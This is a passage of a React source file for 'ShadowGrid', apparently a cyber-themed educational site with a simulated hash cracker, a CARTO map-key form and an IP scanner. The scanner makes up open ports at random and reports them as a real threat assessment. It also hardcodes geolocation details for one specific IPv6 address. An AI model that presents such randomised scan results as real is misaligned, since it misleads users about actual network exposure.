import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import MatrixRain from './components/MatrixRain';
import { ToolDetailSection, ToolKey } from './components/ToolDetailSection';



const CopyButton = ({ text, copiedText, onCopy }: { text: string, copiedText: string | null, onCopy: (t: string) => void }) => (
  <i 
    className={`fa-solid ${copiedText === text ? 'fa-check text-success' : 'fa-copy text-secondary'} ms-2 hover-opacity-75`} 
    style={{ cursor: 'pointer', transition: 'all 0.2s' }} 
    title="Copy command" 
    onClick={(e) => { e.stopPropagation(); onCopy(text); }}
  ></i>
);

const DecryptedText = ({ text, className = "" }: { text: string, className?: string }) => {
  const [displayText, setDisplayText] = useState(text);
  const [isAnimating, setIsAnimating] = useState(false);
  const chars = "!@#$%^&*()_+~`|}{[]:;?><,./-=";

  const triggerAnimation = () => {
    if (isAnimating) return;
    setIsAnimating(true);
    let iteration = 0;
    const interval = setInterval(() => {
      setDisplayText((prev) => 
        text.split("").map((char, index) => {
          if (index < iteration) {
            return text[index];
          }
          if (text[index] === " ") return " ";
          return chars[Math.floor(Math.random() * chars.length)];
        }).join("")
      );
      
      if (iteration >= text.length) {
        clearInterval(interval);
        setIsAnimating(false);
      }
      
      iteration += 1 / 2; // Adjust speed of locking characters here
    }, 30);
  };

  useEffect(() => {
    triggerAnimation();
  }, [text]);

  return (
    <span className={className} style={{ whiteSpace: 'pre-wrap' }}>
      {displayText}
    </span>
  );
};

const GlitchText = ({ text, className = "" }: { text: string, className?: string }) => (
  <span className={`glitch-wrapper ${className}`}>
    <span className="glitch-text" data-text={text}>
      {text}
    </span>
  </span>
);

const BreachModal = ({ isOpen, onClose }: { isOpen: boolean, onClose: () => void }) => {
  if (!isOpen) return null;
  
  return (
    <div className="breach-overlay">
      <div className="text-center p-5 cyber-card breach-pulse" style={{ maxWidth: '600px', width: '90%', backgroundColor: '#050000' }}>
        <i className="fa-solid fa-triangle-exclamation text-danger" style={{ fontSize: '4rem', marginBottom: '1rem' }}></i>
        <div className="breach-banner p-3 mb-4 rounded">
          <h2 className="m-0 fw-bold display-6">CRITICAL SECURITY BREACH</h2>
        </div>
        <p className="text-light mb-4 fs-5" style={{ textShadow: '0 0 5px rgba(255,255,255,0.5)' }}>
          UNAUTHORIZED ACCESS DETECTED. SYSTEM LOCKDOWN INITIATED.
          ALL NETWORK ACTIVITY IS BEING MONITORED AND TRACED.
        </p>
        <div className="font-monospace text-danger mb-4" style={{ textAlign: 'left', background: '#110000', padding: '15px', borderRadius: '5px', border: '1px solid var(--cyber-red)' }}>
          {">"} ERR: ACCESS_DENIED<br/>
          {">"} FIREWALL_BYPASS_DETECTED<br/>
          {">"} INITIATING_COUNTER_MEASURES...<br/>
          {">"} TRACING_ORIGIN_IP... <span className="text-light">[PENDING]</span>
        </div>
        <button className="btn btn-outline-danger btn-lg w-100" onClick={onClose} style={{ fontWeight: 'bold', letterSpacing: '1px' }}>
          [ BYPASS LOCKDOWN ]
        </button>
      </div>
    </div>
  );
};

const CartoSettingsModal = ({
  isOpen,
  onClose,
  cartoStatus,
  inputCartoKey,
  setInputCartoKey,
  cartoTestStatus,
  onTestKey,
  onSaveKey,
  cartoSaveMsg
}: {
  isOpen: boolean;
  onClose: () => void;
  cartoStatus: { configured: boolean; mode: string; maskedKey?: string; tileEndpoint?: string } | null;
  inputCartoKey: string;
  setInputCartoKey: (k: string) => void;
  cartoTestStatus: { loading: boolean; success?: boolean; message?: string } | null;
  onTestKey: (k: string) => void;
  onSaveKey: (e: React.FormEvent) => void;
  cartoSaveMsg: string | null;
}) => {
  if (!isOpen) return null;

  return (
    <div className="breach-overlay" style={{ zIndex: 1050 }}>
      <div
        className="cyber-card p-4"
        style={{
          maxWidth: '620px',
          width: '95%',
          backgroundColor: '#0a0e17',
          border: '1px solid var(--cyber-green)',
          boxShadow: '0 0 35px rgba(0, 255, 102, 0.25)'
        }}
      >
        <div className="d-flex justify-content-between align-items-center border-bottom border-success pb-3 mb-3">
          <div className="d-flex align-items-center gap-2">
            <i className="fa-solid fa-map-location-dot text-success fa-lg"></i>
            <h5 className="text-white mb-0 font-monospace">CARTO DARK GIS INTEGRATION</h5>
          </div>
          <button
            type="button"
            className="btn btn-outline-danger btn-sm py-0 px-2 font-monospace"
            onClick={onClose}
          >
            <i className="fa-solid fa-xmark"></i>
          </button>
        </div>

        {/* Current status indicator */}
        <div className="p-3 mb-3 rounded bg-dark border border-secondary font-monospace">
          <div className="d-flex justify-content-between align-items-center flex-wrap gap-2 mb-2">
            <span className="text-secondary small">CURRENT TILE STATUS:</span>
            {cartoStatus?.configured ? (
              <span className="badge bg-success text-black fw-bold">
                <i className="fa-solid fa-check-circle me-1"></i>
                ENTERPRISE KEY ACTIVE
              </span>
            ) : (
              <span className="badge bg-secondary text-white">
                <i className="fa-solid fa-earth-americas me-1"></i>
                PUBLIC CARTO CDN MODE
              </span>
            )}
          </div>
          <div className="small text-secondary">
            <strong>Active Key:</strong>{' '}
            <span className="text-white">
              {cartoStatus?.maskedKey || (cartoStatus?.configured ? 'Configured in Environment' : 'None (Using public tier)')}
            </span>
          </div>
          <div className="small text-secondary">
            <strong>Tile Layer:</strong>{' '}
            <span className="text-info font-monospace" style={{ fontSize: '11px' }}>
              {cartoStatus?.tileEndpoint || '/api/carto/tile/{z}/{x}/{y}.png'}
            </span>
          </div>
        </div>

        {/* Form to enter/update CARTO key */}
        <form onSubmit={onSaveKey}>
          <div className="mb-3">
            <label className="form-label text-secondary small font-monospace">
              CARTO API Key (from carto.com)
            </label>
            <div className="input-group">
              <span className="input-group-text bg-black border-secondary text-success">
                <i className="fa-solid fa-key"></i>
              </span>
              <input
                type="text"
                className="form-control bg-dark text-white border-secondary font-monospace"
                placeholder="e.g. cb1_4mmz_1_d3ee21b1a7fa..."
                value={inputCartoKey}
                onChange={(e) => setInputCartoKey(e.target.value)}
              />
              <button
                type="button"
                className="btn btn-outline-info font-monospace btn-sm"
                onClick={() => onTestKey(inputCartoKey)}
                disabled={cartoTestStatus?.loading}
                title="Test key against CARTO basemap CDN"
              >
                {cartoTestStatus?.loading ? (
                  <><i className="fa-solid fa-spinner fa-spin me-1"></i> Testing...</>
                ) : (
                  <><i className="fa-solid fa-vial me-1"></i> Test Key</>
                )}
              </button>
            </div>
            <div className="form-text text-secondary small font-monospace mt-1">
              Provides authenticated, high-rate-limit access to CARTO Dark Matter GIS raster tiles.
            </div>
          </div>

          {/* Test feedback */}
          {cartoTestStatus && !cartoTestStatus.loading && (
            <div
              className={`p-2 mb-3 rounded small font-monospace border ${
                cartoTestStatus.success ? 'bg-success bg-opacity-10 border-success text-success' : 'bg-danger bg-opacity-10 border-danger text-danger'
              }`}
            >
              <i className={`fa-solid ${cartoTestStatus.success ? 'fa-check' : 'fa-triangle-exclamation'} me-2`}></i>
              {cartoTestStatus.message}
            </div>
          )}

          {/* Save feedback */}
          {cartoSaveMsg && (
            <div className="p-2 mb-3 rounded small font-monospace bg-info bg-opacity-10 border border-info text-info">
              <i className="fa-solid fa-info-circle me-2"></i>
              {cartoSaveMsg}
            </div>
          )}

          <div className="d-flex justify-content-end gap-2 mt-4">
            <button
              type="button"
              className="btn btn-outline-secondary font-monospace btn-sm"
              onClick={() => {
                setInputCartoKey('');
                onSaveKey({ preventDefault: () => {} } as any);
              }}
            >
              Reset to Public CDN
            </button>
            <button
              type="submit"
              className="btn btn-cyber font-monospace btn-sm px-3"
            >
              <i className="fa-solid fa-floppy-disk me-1"></i>
              Save & Apply Key
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

const HashCrackerSection = () => {
  const [password, setPassword] = useState('');
  const [hashes, setHashes] = useState({ md5: '', sha256: '' });
  const [strength, setStrength] = useState({ score: 0, label: 'Very Weak', color: 'danger' });
  const [entropyStats, setEntropyStats] = useState({ poolSize: 0, entropy: 0, length: 0 });
  const [isCracking, setIsCracking] = useState(false);
  const [crackAttempts, setCrackAttempts] = useState(0);
  const [crackTime, setCrackTime] = useState<string | null>(null);

  // Simple mock MD5 for demonstration
  const getMockMD5 = (str: string) => {
    let hash = 0;
    for (let i = 0; i < str.length; i++) hash = Math.imul(31, hash) + str.charCodeAt(i) | 0;
    const hex = Math.abs(hash).toString(16);
    return hex.padStart(32, hex).substring(0, 32);
  };

  const getSHA256 = async (str: string) => {
    try {
      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
      return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
    } catch {
      return 'Error generating hash';
    }
  };

  useEffect(() => {
    if (!password) {
      setHashes({ md5: '', sha256: '' });
      setStrength({ score: 0, label: 'None', color: 'secondary' });
      setEntropyStats({ poolSize: 0, entropy: 0, length: 0 });
      return;
    }

    // Hash generation
    getSHA256(password).then(sha => {
      setHashes({ md5: getMockMD5(password), sha256: sha });
    });

    // Entropy-based strength calculation
    let poolSize = 0;
    if (/[a-z]/.test(password)) poolSize += 26;
    if (/[A-Z]/.test(password)) poolSize += 26;
    if (/[0-9]/.test(password)) poolSize += 10;
    if (/[^a-zA-Z0-9]/.test(password)) poolSize += 32;

    const entropy = password.length * Math.log2(poolSize || 1);
    
    let score = 0;
    if (entropy < 28) score = 0;
    else if (entropy < 40) score = 1;
    else if (entropy < 60) score = 2;
    else if (entropy < 80) score = 3;
    else score = 4;

    const labels = ['Very Weak', 'Weak', 'Fair', 'Strong', 'Very Strong'];
    const colors = ['danger', 'danger', 'warning', 'info', 'success'];

    setStrength({ score, label: labels[score], color: colors[score] });
    setEntropyStats({ poolSize, entropy, length: password.length });
    setCrackTime(null);
    setCrackAttempts(0);
  }, [password]);

  const runBruteForce = () => {
    if (!password) return;
    setIsCracking(true);
    setCrackAttempts(0);
    setCrackTime(null);

    const dictionary = ['123456', 'password', '12345678', 'qwerty', '12345', '123456789', 'football', 'admin', 'welcome'];
    const isCommon = dictionary.includes(password.toLowerCase());
    
    let attempts = 0;
    const maxAttempts = isCommon ? dictionary.indexOf(password.toLowerCase()) + 1 : 150000;
    const interval = setInterval(() => {
      attempts += isCommon ? 1 : Math.floor(Math.random() * 5000) + 1000;
      setCrackAttempts(attempts);

      if (isCommon && attempts >= maxAttempts) {
        clearInterval(interval);
        setIsCracking(false);
        setCrackTime('0.02 seconds (Found in common dictionary)');
      } else if (!isCommon && attempts >= maxAttempts) {
        clearInterval(interval);
        setIsCracking(false);
        const timeToCrack = strength.score > 3 ? 'Years/Centuries' : strength.score > 2 ? 'Hours/Days' : 'Minutes';
        setCrackTime(timeToCrack + ` (Simulated ${attempts.toLocaleString()} attempts)`);
      }
    }, 50);
  };

  return (
    <section id="hashCracker" className="min-vh-100 pt-5 mt-5">
      <div className="container">
        <h2 className="section-title text-center"><i className="fa-solid fa-unlock-keyhole me-2"></i><DecryptedText text="Hash Cracker & Password Strength" /></h2>
        
        <div className="row justify-content-center g-4">
          <div className="col-lg-8">
            <div className="cyber-card p-4 mb-4">
              <h4 className="mb-4 text-info"><i className="fa-solid fa-key me-2"></i>Password Analyzer</h4>
              
              <div className="mb-4">
                <label className="form-label text-secondary">Test Password</label>
                <input 
                  type="text" 
                  className="form-control form-control-lg" 
                  placeholder="Type a password to analyze..." 
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  style={{ fontFamily: 'monospace' }}
                />
              </div>

              {password && (
                <div className="mb-4">
                  <div className="d-flex justify-content-between mb-1">
                    <span className="text-secondary">Strength Score</span>
                    <span className={`text-${strength.color} fw-bold`}>{strength.label}</span>
                  </div>
                  <div className="progress mb-2" style={{ height: '10px', backgroundColor: '#111' }}>
                    <div 
                      className={`progress-bar bg-${strength.color}`} 
                      role="progressbar" 
                      style={{ width: `${Math.max(10, strength.score * 25)}%`, transition: 'width 0.3s ease, background-color 0.3s ease' }}
                    ></div>
                  </div>
                  <div className="d-flex justify-content-between text-secondary mt-2 px-1" style={{ fontSize: '0.85rem' }}>
                    <span>Length: <strong className="text-light">{entropyStats.length}</strong></span>
                    <span>Character Pool: <strong className="text-light">{entropyStats.poolSize}</strong></span>
                    <span>Entropy: <strong className="text-light">{Math.round(entropyStats.entropy)} bits</strong></span>
                  </div>
                </div>
              )}

              {password && (
                <div className="terminal-box mb-4">
                  <div className="mb-2">
                    <span className="text-secondary">MD5 Hash:</span>
                    <div className="text-warning text-break" style={{ fontFamily: 'monospace' }}>{hashes.md5}</div>
                  </div>
                  <div>
                    <span className="text-secondary">SHA-256 Hash:</span>
                    <div className="text-info text-break" style={{ fontFamily: 'monospace' }}>{hashes.sha256}</div>
                  </div>
                </div>
              )}

              <button 
                className="btn btn-cyber w-100" 
                onClick={runBruteForce}
                disabled={!password || isCracking}
              >
                <i className={`fa-solid ${isCracking ? 'fa-spinner fa-spin' : 'fa-hammer'} me-2`}></i>
                {isCracking ? 'Simulating Brute-Force...' : 'Run Brute-Force Simulation'}
              </button>

              {(isCracking || crackTime) && (
                <div className="mt-4 p-3 border border-secondary rounded bg-dark">
                  <div className="d-flex justify-content-between align-items-center mb-2">
                    <span className="text-secondary"><i className="fa-solid fa-terminal me-2"></i>Cracking Status:</span>
                    <span className={isCracking ? 'text-warning' : 'text-danger fw-bold'}>
                      {isCracking ? 'IN PROGRESS' : 'CRACKED / STOPPED'}
                    </span>
                  </div>
                  <div className="mb-1">
                    <span className="text-secondary">Attempts: </span>
                    <span className="text-white" style={{ fontFamily: 'monospace' }}>{crackAttempts.toLocaleString()}</span>
                  </div>
                  {crackTime && (
                    <div>
                      <span className="text-secondary">Estimated Time to Crack: </span>
                      <span className="text-danger fw-bold">{crackTime}</span>
                    </div>
                  )}
                </div>
              )}
            </div>
            
            <div className="cyber-card p-4 border-info" style={{borderWidth: '2px'}}>
               <h5 className="text-info mb-3"><i className="fa-solid fa-circle-info me-2"></i>How Passwords are Cracked</h5>
               <p className="text-secondary mb-2"><strong className="text-white">Dictionary Attack:</strong> Hackers use massive lists of common passwords (like "123456", "password123") and simply try all of them. If your password is in the list, it's cracked instantly.</p>
               <p className="text-secondary mb-2"><strong className="text-white">Brute-Force Attack:</strong> Trying every possible combination of characters (a, b, c... aa, ab...). This takes much longer but is inevitable for short passwords.</p>
               <p className="text-secondary mb-0"><strong className="text-white">Hashing:</strong> Websites shouldn't store your actual password. They store a "Hash" (like the SHA-256 above). When hackers steal the database, they use powerful GPUs to generate hashes for billions of guesses per second until they find a hash that matches yours.</p>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default function App() {
  const [targetIP, setTargetIP] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [progress, setProgress] = useState(0);
  const [logs, setLogs] = useState<React.ReactNode[]>([]);
  const [showLocation, setShowLocation] = useState(false);
  const [ipGeoData, setIpGeoData] = useState<any>(null);
  const [recentScans, setRecentScans] = useState<string[]>([]);
  const [currentView, setCurrentView] = useState<'home' | 'scanner' | 'labs' | 'signin' | 'ethicalHacking' | 'linuxSecurity' | 'networkDefense' | 'hashCracker' | 'toolDetail'>('home');
  const [selectedToolKey, setSelectedToolKey] = useState<ToolKey>('sqlmap');
  const [isLightMode, setIsLightMode] = useState(false);
  const [isBreachModalOpen, setIsBreachModalOpen] = useState(false);
  const [copiedText, setCopiedText] = useState<string | null>(null);
  const [loggedInUser, setLoggedInUser] = useState<string | null>(null);
  const [accountName, setAccountName] = useState('');
  const [authSuccessMsg, setAuthSuccessMsg] = useState<string | null>(null);
  const [isEditingName, setIsEditingName] = useState(false);
  const [newName, setNewName] = useState('');
  const [operatorGeo, setOperatorGeo] = useState<any>(null);
  const [isLoadingOperator, setIsLoadingOperator] = useState(false);
  const [expandedTools, setExpandedTools] = useState<Record<string, boolean>>({});

  const openToolDetailPage = (toolKey: ToolKey) => {
    setSelectedToolKey(toolKey);
    setCurrentView('toolDetail');
    window.location.hash = `tool-${toolKey}`;
    window.scrollTo(0, 0);
  };

  const toggleToolReadMore = (toolKey: string) => {
    openToolDetailPage(toolKey as ToolKey);
  };

  useEffect(() => {
    const handleHashSync = () => {
      const hash = window.location.hash.replace(/^#/, '');
      if (hash.startsWith('tool-')) {
        const key = hash.replace('tool-', '') as ToolKey;
        if (['sqlmap', 'scapy', 'impacket', 'dirsearch', 'wfuzz', 'responder'].includes(key)) {
          setSelectedToolKey(key);
          setCurrentView('toolDetail');
          return;
        }
      }
      if (hash && ['home', 'scanner', 'labs', 'ethicalHacking', 'linuxSecurity', 'networkDefense', 'hashCracker', 'signin', 'toolDetail'].includes(hash)) {
        setCurrentView(hash as any);
      }
    };
    handleHashSync();
    window.addEventListener('hashchange', handleHashSync);
    return () => window.removeEventListener('hashchange', handleHashSync);
  }, []);

  // CARTO Dark Matter GIS state
  const [cartoStatus, setCartoStatus] = useState<{ configured: boolean; mode: string; maskedKey?: string; tileEndpoint?: string } | null>(null);
  const [isCartoModalOpen, setIsCartoModalOpen] = useState(false);
  const [inputCartoKey, setInputCartoKey] = useState('');
  const [cartoTestStatus, setCartoTestStatus] = useState<{ loading: boolean; success?: boolean; message?: string } | null>(null);
  const [cartoSaveMsg, setCartoSaveMsg] = useState<string | null>(null);

  const fetchCartoStatus = async () => {
    try {
      const res = await fetch('/api/carto/status');
      const data = await res.json();
      setCartoStatus(data);
    } catch {
      // Ignore
    }
  };

  useEffect(() => {
    fetchCartoStatus();
  }, []);

  const handleTestCartoKey = async (keyToTest: string) => {
    setCartoTestStatus({ loading: true });
    try {
      const queryParam = keyToTest.trim() ? `?key=${encodeURIComponent(keyToTest.trim())}` : '';
      const res = await fetch(`/api/carto/test${queryParam}`);
      const data = await res.json();
      setCartoTestStatus({
        loading: false,
        success: data.success,
        message: data.message || (data.success ? 'CARTO key verified!' : 'Key validation failed.')
      });
    } catch {
      setCartoTestStatus({
        loading: false,
        success: false,
        message: 'Network error connecting to CARTO test API'
      });
    }
  };

  const handleSaveCartoKey = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await fetch('/api/carto/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ apiKey: inputCartoKey.trim() })
      });
      const data = await res.json();
      await fetchCartoStatus();
      setCartoSaveMsg(data.message || 'CARTO configuration updated.');
      setTimeout(() => setCartoSaveMsg(null), 4000);
    } catch {
      setCartoSaveMsg('Failed to update CARTO configuration.');
      setTimeout(() => setCartoSaveMsg(null), 4000);
    }
  };

  useEffect(() => {
    const storedUser = localStorage.getItem('shadowgrid_user');
    if (storedUser) {
      setLoggedInUser(storedUser);
    }
  }, []);

  useEffect(() => {
    const fetchOperatorIP = async () => {
      setIsLoadingOperator(true);
      try {
        const res = await fetch('/api/my-ip');
        const data = await res.json();
        if (data && data.success) {
          setOperatorGeo(data);
        }
      } catch (err) {
        console.error('Operator IP resolution failed:', err);
      } finally {
        setIsLoadingOperator(false);
      }
    };
    fetchOperatorIP();
  }, []);

  const handleSignIn = (e: React.FormEvent) => {
    e.preventDefault();
    if (accountName.trim()) {
      const sanitizedName = accountName.trim();
      localStorage.setItem('shadowgrid_user', sanitizedName);
      setLoggedInUser(sanitizedName);
      setAuthSuccessMsg(`Operator verified: Welcome back, ${sanitizedName}. Session active.`);
      setAccountName('');
      setTimeout(() => setAuthSuccessMsg(null), 5000);
    }
  };

  const handleUpdateName = (e: React.FormEvent) => {
    e.preventDefault();
    if (newName.trim()) {
      localStorage.setItem('shadowgrid_user', newName);
      setLoggedInUser(newName);
      setIsEditingName(false);
    }
  };

  const handleSignOut = () => {
    localStorage.removeItem('shadowgrid_user');
    setLoggedInUser(null);
    setAuthSuccessMsg(null);
  };

  const fallbackCopy = (text: string) => {
    try {
      const textArea = document.createElement('textarea');
      textArea.value = text;
      textArea.style.position = 'fixed';
      textArea.style.left = '-999999px';
      textArea.style.top = '-999999px';
      document.body.appendChild(textArea);
      textArea.focus();
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
    } catch {
      // Silent fail
    }
  };

  const handleCopy = (text: string) => {
    try {
      if (navigator?.clipboard?.writeText) {
        navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
      } else {
        fallbackCopy(text);
      }
    } catch {
      fallbackCopy(text);
    }
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000);
  };

  useEffect(() => {
    if (isLightMode) {
      document.documentElement.setAttribute('data-theme', 'light');
    } else {
      document.documentElement.removeAttribute('data-theme');
    }
  }, [isLightMode]);

  const performScan = async (targetToScan: string) => {
    const cleanTarget = targetToScan.replace(/^["']|["']$/g, '').trim();
    if (!cleanTarget) return;

    setTargetIP(cleanTarget);
    setRecentScans(prev => {
      const newScans = prev.filter(ip => ip !== cleanTarget);
      return [cleanTarget, ...newScans].slice(0, 5);
    });

    setIsScanning(true);
    setProgress(0);
    setLogs([]);
    setShowLocation(false);
    setIpGeoData(null);

    const isSpecificTarget = cleanTarget.toLowerCase() === '2401:4900:aba6:cfa0:7c3a:91ff:fe91:f22e';
    if (isSpecificTarget) {
      setIpGeoData({
        success: true,
        ip: "2401:4900:aba6:cfa0:7c3a:91ff:fe91:f22e",
        target: "2401:4900:aba6:cfa0:7c3a:91ff:fe91:f22e",
        city: "Mumbai",
        region: "Maharashtra",
        country: "India",
        country_code: "IN",
        latitude: 19.0728322,
        longitude: 72.8826083,
        connection: {
          isp: "Bharti Airtel Limited",
          asn: "45609",
          org: "Bharti Airtel Limited",
          domain: "airtel.in"
        }
      });
    }

    try {
      const response = await fetch('/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target: cleanTarget })
      });
      const data = await response.json();
      
      if (data && data.success) {
        setIpGeoData(data);
      } else if (!isSpecificTarget) {
        setIpGeoData({ error: true, ip: cleanTarget, message: data.message || "Lookup failed" });
      }
    } catch {
      if (!isSpecificTarget) {
        setIpGeoData({ error: true, ip: cleanTarget, message: "Network error" });
      }
    }

    const commonPorts = [
      { port: 21, service: 'FTP', risk: 'Medium' },
      { port: 22, service: 'SSH', risk: 'Medium' },
      { port: 23, service: 'Telnet', risk: 'High' },
      { port: 80, service: 'HTTP', risk: 'Low' },
      { port: 443, service: 'HTTPS', risk: 'Low' },
      { port: 445, service: 'SMB', risk: 'High' },
      { port: 3306, service: 'MySQL', risk: 'High' },
      { port: 3389, service: 'RDP', risk: 'Medium' },
    ];

    const detected = commonPorts.filter(p => p.port === 80 || p.port === 443 || Math.random() > 0.65);
    let threatLevel = 'Low';
    if (detected.some(p => p.risk === 'High')) threatLevel = 'High';
    else if (detected.some(p => p.risk === 'Medium')) threatLevel = 'Medium';

    const threatBadgeClass = threatLevel === 'High' ? 'danger' : threatLevel === 'Medium' ? 'warning' : 'success';

    const portLogs = detected.map(p => (
      <React.Fragment key={p.port}>
        <span className={p.risk === 'High' ? 'text-danger fw-bold' : p.risk === 'Medium' ? 'text-warning' : 'text-success'}>
          [OPEN] Port {p.port}/tcp ({p.service})
        </span><br/>
      </React.Fragment>
    ));

    const scanSteps = [
      { pct: 20, text: <><span className="text-info">&gt; Initializing traceroute query to target: <strong>{cleanTarget}</strong>...</span></> },
      { pct: 40, text: <><span className="text-warning">[+] Resolving DNS nodes & geospatial grid coordinates...</span></> },
      { pct: 60, text: <><span className="text-light">[+] Traversing ISP routing hops & BGP autonomous tables...</span><br/><span className="text-success">[+] IP geolocation packet payload secured.</span></> },
      { pct: 80, text: <>{portLogs}</> },
      { pct: 100, text: <><span className={`text-${threatBadgeClass} fw-bold`}>[!] FINAL ASSESSMENT: THREAT LEVEL {threatLevel.toUpperCase()}</span><br/><span className="text-info">&gt; IP Geolocation & Threat Telemetry Data Resolved!</span></> }
    ];

    let stepIndex = 0;
    const interval = setInterval(() => {
      if (stepIndex < scanSteps.length) {
        const currentStep = scanSteps[stepIndex];
        setProgress(currentStep.pct);
        setLogs(prev => [...prev, currentStep.text]);
        stepIndex++;
      } else {
        clearInterval(interval);
        setIsScanning(false);
        setShowLocation(true);
      }
    }, 600);
  };

  const executeLiveScan = (e: React.FormEvent) => {
    e.preventDefault();
    performScan(targetIP);
  };

  return (
    <>
      <MatrixRain />
      <BreachModal isOpen={isBreachModalOpen} onClose={() => setIsBreachModalOpen(false)} />
      <CartoSettingsModal
        isOpen={isCartoModalOpen}
        onClose={() => setIsCartoModalOpen(false)}
        cartoStatus={cartoStatus}
        inputCartoKey={inputCartoKey}
        setInputCartoKey={setInputCartoKey}
        cartoTestStatus={cartoTestStatus}
        onTestKey={handleTestCartoKey}
        onSaveKey={handleSaveCartoKey}
        cartoSaveMsg={cartoSaveMsg}
      />
      <nav className="navbar navbar-expand-lg fixed-top">
        <div className="container">
          <a className="navbar-brand" href="#home" onClick={(e) => { e.preventDefault(); setCurrentView('home'); window.scrollTo(0,0); }}><i className="fa-solid fa-shield-halved me-2"></i><DecryptedText text="SHADOWGRID" /></a>
          <button className="navbar-toggler navbar-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <span className="navbar-toggler-icon"></span>
          </button>
          <div className="collapse navbar-collapse" id="navbarNav">
            <ul className="navbar-nav ms-auto">
              <li className="nav-item"><a className={`nav-link ${currentView === 'home' ? 'active' : ''}`} href="#home" onClick={(e) => { e.preventDefault(); setCurrentView('home'); window.scrollTo(0,0); }}>Home</a></li>
              <li className="nav-item"><a className={`nav-link ${currentView === 'scanner' ? 'active' : ''}`} href="#scanner" onClick={(e) => { e.preventDefault(); setCurrentView('scanner'); window.scrollTo(0,0); }}>Scanner Tool</a></li>
              <li className="nav-item"><a className={`nav-link ${currentView === 'labs' || currentView === 'ethicalHacking' || currentView === 'linuxSecurity' || currentView === 'toolDetail' ? 'active' : ''}`} href="#labs" onClick={(e) => { e.preventDefault(); setCurrentView('labs'); window.scrollTo(0,0); }}>Cyber Labs</a></li>
              <li className="nav-item"><a className={`nav-link ${currentView === 'networkDefense' ? 'active' : ''}`} href="#networkDefense" onClick={(e) => { e.preventDefault(); setCurrentView('networkDefense'); window.scrollTo(0,0); }}>Network Defense</a></li>
              <li className="nav-item"><a className={`nav-link ${currentView === 'hashCracker' ? 'active' : ''}`} href="#hashCracker" onClick={(e) => { e.preventDefault(); setCurrentView('hashCracker'); window.scrollTo(0,0); }}>Hash Cracker</a></li>
              <li className="nav-item d-flex align-items-center ms-lg-3 me-2">
                <div className="form-check form-switch mb-0" style={{ cursor: 'pointer' }}>
                  <input className="form-check-input" type="checkbox" id="themeSwitch" checked={isLightMode} onChange={() => setIsLightMode(!isLightMode)} style={{ cursor: 'pointer', backgroundColor: isLightMode ? 'var(--cyber-green)' : 'transparent', borderColor: 'var(--cyber-green)' }} />
                  <label className="form-check-label text-secondary ms-1" htmlFor="themeSwitch" style={{ cursor: 'pointer' }}>
                    <i className={`fa-solid ${isLightMode ? 'fa-sun text-warning' : 'fa-moon text-light'}`}></i>
                  </label>
                </div>
              </li>
              {loggedInUser ? (
                <li className="nav-item d-flex align-items-center ms-lg-1">
                  {isEditingName ? (
                    <form onSubmit={handleUpdateName} className="d-flex align-items-center me-3">
                      <input type="text" className="form-control form-control-sm me-2 bg-dark text-info border-info" style={{ width: '140px' }} value={newName} onChange={e => setNewName(e.target.value)} autoFocus />
                      <button type="submit" className="btn btn-sm btn-outline-success me-1 py-0 px-2"><i className="fa-solid fa-check"></i></button>
                      <button type="button" className="btn btn-sm btn-outline-danger py-0 px-2" onClick={() => setIsEditingName(false)}><i className="fa-solid fa-xmark"></i></button>
                    </form>
                  ) : (
                    <span className="text-info me-3 fw-bold d-flex align-items-center">
                      <i className="fa-solid fa-user me-2"></i>
                      {loggedInUser}
                      <i className="fa-solid fa-pen ms-2 text-secondary" style={{ cursor: 'pointer', fontSize: '0.8rem', transition: 'color 0.2s' }} onMouseEnter={(e) => e.currentTarget.classList.replace('text-secondary', 'text-info')} onMouseLeave={(e) => e.currentTarget.classList.replace('text-info', 'text-secondary')} onClick={() => { setIsEditingName(true); setNewName(loggedInUser); }} title="Change Account Name"></i>
                    </span>
                  )}
                  <button className="btn btn-outline-danger btn-sm" onClick={handleSignOut}>Sign Out</button>
                </li>
              ) : (
                <li className="nav-item"><a className={`nav-link btn btn-cyber ms-lg-1 px-3 ${currentView === 'signin' ? 'active' : ''}`} href="#signin" onClick={(e) => { e.preventDefault(); setCurrentView('signin'); window.scrollTo(0,0); }}>Sign In</a></li>
              )}
            </ul>
          </div>
        </div>
      </nav>

      <AnimatePresence mode="wait">
        <motion.div
          key={currentView}
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -15 }}
          transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
        >
      {currentView === 'home' && (
      <section id="home" className="d-flex align-items-center min-vh-100">
        <div className="container mt-5">
          <div className="row align-items-center">
            <div className="col-lg-6">
              <h1 className="display-4 fw-bold text-white mb-3">
                <GlitchText text="CYBER THREAT" /> <span style={{ color: 'var(--cyber-green)' }}><GlitchText text="ANALYTICS" /></span>
              </h1>
              <p className="lead text-secondary mb-4">Interactive cyber-defense platform for threat hunting, network scanning, and real-time security analytics.</p>
              <a href="#scanner" className="btn btn-cyber btn-lg me-3" onClick={(e) => { e.preventDefault(); setCurrentView('scanner'); window.scrollTo(0,0); }}><i className="fa-solid fa-terminal me-2"></i>Launch Scanner</a>
              <a href="#labs" className="btn btn-outline-light btn-lg me-3" onClick={(e) => { e.preventDefault(); setCurrentView('labs'); window.scrollTo(0,0); }}><i className="fa-solid fa-flask me-2"></i>Access Labs</a>
            </div>
            <div className="col-lg-6 mt-4 mt-lg-0">
              <div className="terminal-box">
                <p className="mb-1"><span className="text-secondary">[05:01:17]</span> <span className="text-info">SYSTEM_INIT:</span> ShadowGrid Framework v2.4 Loaded...</p>
